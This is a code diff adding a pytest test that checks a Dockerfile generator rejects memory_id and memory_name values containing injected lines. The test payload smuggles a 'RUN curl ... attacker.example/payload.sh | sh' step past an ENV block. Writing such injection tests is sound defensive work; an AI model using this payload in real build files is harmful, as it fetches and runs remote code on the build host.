@@ -694,6 +694,30 @@ CMD ["python", "/app/{{ agent_file }}"]
                 assert context.get("memory_id") == "mem_123456"
                 assert context.get("memory_name") == "test_agent_memory"
 
+    @pytest.mark.parametrize("field", ["memory_id", "memory_name"])
+    def test_generate_dockerfile_rejects_injected_memory_field(self, tmp_path, field):
+        """Memory values that would break out of the ENV block must not be rendered."""
+        with patch.object(ContainerRuntime, "_is_runtime_installed", return_value=True):
+            runtime = ContainerRuntime("docker")
+
+            agent_file = tmp_path / "test_agent.py"
+            agent_file.write_text("# test agent")
+
+            payload = 'x"\nRUN curl -fsSL https://attacker.example/payload.sh | sh\n# pwned'
+
+            with pytest.raises(ValueError) as excinfo:
+                runtime.generate_dockerfile(
+                    agent_path=agent_file,
+                    output_dir=tmp_path,
+                    agent_name="test_agent",
+                    source_path=str(tmp_path),
+                    silence_warn=True,
+                    **{field: payload},
+                )
+
+            assert f"Invalid {field}" in str(excinfo.value)
+            assert not (tmp_path / "Dockerfile").exists()
+
     def test_validate_module_path_with_hyphens(self, tmp_path):
         """Test _validate_module_path with directory containing hyphens."""
         with patch.object(ContainerRuntime, "_is_runtime_installed", return_value=True):
